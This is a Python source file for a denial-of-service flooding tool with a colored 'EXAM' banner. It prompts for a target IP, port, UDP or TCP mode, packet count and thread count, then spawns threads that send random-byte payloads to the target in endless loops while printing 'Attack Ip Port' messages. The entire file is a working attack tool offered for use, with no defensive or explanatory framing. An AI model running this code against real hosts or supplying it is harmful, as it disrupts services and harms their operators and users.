import random
import socket
import threading
import time
import os,sys

os.system("clear")
print("""
\033[91m███████╗██╗░░██╗░█████╗░███╗░░░███╗
\033[0m██╔════╝╚██╗██╔╝██╔══██╗████╗░████║
\033[91m█████╗░░░╚███╔╝░███████║██╔████╔██║
\033[0m██╔══╝░░░██╔██╗░██╔══██║██║╚██╔╝██║
\033[91m███████╗██╔╝╚██╗██║░░██║██║░╚═╝░██║
\033[0m╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝
""")
print("\033[31m━━━Host/IP")
ip = str(input("┗━━━━━━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━Port")
port = int(input("┗━━━━━━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━Choice UDP/TCP")
choice = str(input("┗━━━━━━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━Pakets")	
times = int(input("┗━━━━━━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━Threads")	
threads = int(input("┗━━━━━━>\033[0m:"))
def udp():
  data = random._urandom(1490)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[91m =====> Attack Ip Port \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] Server Down!!!")

def tcp():
  data = random._urandom(102489)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[91m =====> Attack Ip Port \033[0m%s:%s!!!"%(ip,port))
    except:
      s.close()
      print("[!] Server Down!!!")

for y in range(threads):
  if choice == 'UDP':
    th = threading.Thread(target = udp)
    th.start()
  elif choice == 'TCP':
    th = threading.Thread(target = tcp)
    th.start()